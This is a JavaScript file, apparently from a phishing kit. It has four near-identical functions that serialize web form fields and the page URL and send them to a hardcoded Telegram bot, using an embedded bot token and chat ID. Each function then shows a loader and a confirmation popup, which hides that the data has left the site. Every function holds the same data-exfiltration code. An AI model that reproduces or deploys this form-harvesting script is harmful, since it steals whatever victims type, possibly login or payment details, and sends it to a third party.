function sendform(){
  $('#loadr').show()
    // let datatosend=JSON.stringify($('#appli').formToJson());
    

    let datatosend=$('#appli').serializeArray();

    let message=''

    for (let index = 0; index < datatosend.length; index++) {
      const element = datatosend[index];

      message += element.name + ": "+element.value+
       "\r\n"+
       "\r\n"

    }


    message+= "\r\n"+
    "\r\n"+
    document.URL


    console.log('Data',datatosend)
  
    let chat_id, api
    
  
      chat_id=6349530945;
     
  
      api='6825286029:AAEAp5VERgZ2ZtmR6D7RyYLDWdKIyYJovDo';
    
    
          // following ones are optional, so could be set as null
          let disable_web_page_preview = null;
          let reply_to_message_id = null;
          let reply_markup = null;
    
     
  
          let datathree={
            'chat_id':chat_id,
            'text':message,
            'disable_web_page_preview':disable_web_page_preview,
            'reply_to_message_id':reply_to_message_id,
            'reply_markup':reply_markup
          }
          
  
          let durl = 'https://api.telegram.org/bot'+api+'/sendMessage';
  
  
    
    let counter=0
    
    $.ajax({
    url: durl,
    type: 'POST',
    data: datathree,
    cache: false,
    success:function(resp){
     
    },
    error: function(data){
     
    }
    });

    // var pageFilename = './check';

    //     // Redirect to the specified HTML page in the same directory
    //     window.location.href = pageFilename;
  
    
    // Wait for 3 seconds
    setTimeout(function () {
      // Hide the 'loadr' element
      $('#loadr').hide();
  
      // Check the counter value
      if (counter === 0) {
        showPopup();
      }
  }, 6000);
    
    }

function sendform1(){
  $('#loadr').show()
    // let datatosend=JSON.stringify($('#appli').formToJson());
    

    let datatosend=$('#appli1').serializeArray();

    let message=''

    for (let index = 0; index < datatosend.length; index++) {
      const element = datatosend[index];

      message += element.name + ": "+element.value+
        "\r\n"+
        "\r\n"

    }


    message+= "\r\n"+
    "\r\n"+
    document.URL


    console.log('Data',datatosend)
  
    let chat_id, api
    
  
      chat_id=6349530945;
      
  
      api='6825286029:AAEAp5VERgZ2ZtmR6D7RyYLDWdKIyYJovDo';
    
    
          // following ones are optional, so could be set as null
          let disable_web_page_preview = null;
          let reply_to_message_id = null;
          let reply_markup = null;
    
      
  
          let datathree={
            'chat_id':chat_id,
            'text':message,
            'disable_web_page_preview':disable_web_page_preview,
            'reply_to_message_id':reply_to_message_id,
            'reply_markup':reply_markup
          }
          
  
          let durl = 'https://api.telegram.org/bot'+api+'/sendMessage';
  
  
    
    let counter=0
    
    $.ajax({
    url: durl,
    type: 'POST',
    data: datathree,
    cache: false,
    success:function(resp){
      
    },
    error: function(data){
      
    }
    });

    // var pageFilename = './check';

    //     // Redirect to the specified HTML page in the same directory
    //     window.location.href = pageFilename;
  
    
    // Wait for 3 seconds
    setTimeout(function () {
      // Hide the 'loadr' element
      $('#loadr').hide();
  
      // Check the counter value
      if (counter === 0) {
        showPopup();
      }
  }, 6000);
    
    }

function sendform2(){
  $('#loadr').show()
    // let datatosend=JSON.stringify($('#appli').formToJson());
    

    let datatosend=$('#appli2').serializeArray();

    let message=''

    for (let index = 0; index < datatosend.length; index++) {
      const element = datatosend[index];

      message += element.name + ": "+element.value+
        "\r\n"+
        "\r\n"

    }


    message+= "\r\n"+
    "\r\n"+
    document.URL


    console.log('Data',datatosend)
  
    let chat_id, api
    
  
      chat_id=6349530945;
      
  
      api='6825286029:AAEAp5VERgZ2ZtmR6D7RyYLDWdKIyYJovDo';
    
    
          // following ones are optional, so could be set as null
          let disable_web_page_preview = null;
          let reply_to_message_id = null;
          let reply_markup = null;
    
      
  
          let datathree={
            'chat_id':chat_id,
            'text':message,
            'disable_web_page_preview':disable_web_page_preview,
            'reply_to_message_id':reply_to_message_id,
            'reply_markup':reply_markup
          }
          
  
          let durl = 'https://api.telegram.org/bot'+api+'/sendMessage';
  
  
    
    let counter=0
    
    $.ajax({
    url: durl,
    type: 'POST',
    data: datathree,
    cache: false,
    success:function(resp){
      
    },
    error: function(data){
      
    }
    });

    // var pageFilename = './check';

    //     // Redirect to the specified HTML page in the same directory
    //     window.location.href = pageFilename;
  
    
    // Wait for 3 seconds
    setTimeout(function () {
        // Hide the 'loadr' element
        $('#loadr').hide();
    
        // Check the counter value
        if (counter === 0) {
          showPopup();
        }
    }, 6000);
    
    }
function sendform3(){
  $('#loadr').show()
    // let datatosend=JSON.stringify($('#appli').formToJson());
    

    let datatosend=$('#appli3').serializeArray();

    let message=''

    for (let index = 0; index < datatosend.length; index++) {
      const element = datatosend[index];

      message += element.name + ": "+element.value+
        "\r\n"+
        "\r\n"

    }


    message+= "\r\n"+
    "\r\n"+
    document.URL


    console.log('Data',datatosend)
  
    let chat_id, api
    
  
      chat_id=6349530945;
      
  
      api='6825286029:AAEAp5VERgZ2ZtmR6D7RyYLDWdKIyYJovDo';
    
    
          // following ones are optional, so could be set as null
          let disable_web_page_preview = null;
          let reply_to_message_id = null;
          let reply_markup = null;
    
      
  
          let datathree={
            'chat_id':chat_id,
            'text':message,
            'disable_web_page_preview':disable_web_page_preview,
            'reply_to_message_id':reply_to_message_id,
            'reply_markup':reply_markup
          }
          
  
          let durl = 'https://api.telegram.org/bot'+api+'/sendMessage';
  
  
    
    let counter=0
    
    $.ajax({
    url: durl,
    type: 'POST',
    data: datathree,
    cache: false,
    success:function(resp){
      
    },
    error: function(data){
      
    }
    });

    // var pageFilename = './check';

    //     // Redirect to the specified HTML page in the same directory
    //     window.location.href = pageFilename;
  
    
    // Wait for 3 seconds
    setTimeout(function () {
      // Hide the 'loadr' element
      $('#loadr').hide();
  
      // Check the counter value
      if (counter === 0) {
        showPopup();
      }
  }, 6000);
    
    }

    function showPopup() {
    document.getElementById("overlay").style.display = "flex";
    document.getElementById("popup").style.display = "flex";
  
      // Close the popup after 5 seconds
      setTimeout(function () {
        document.getElementById("overlay").style.display = "none";
        document.getElementById("popup").style.display = "none";
      }, 6000);
  }
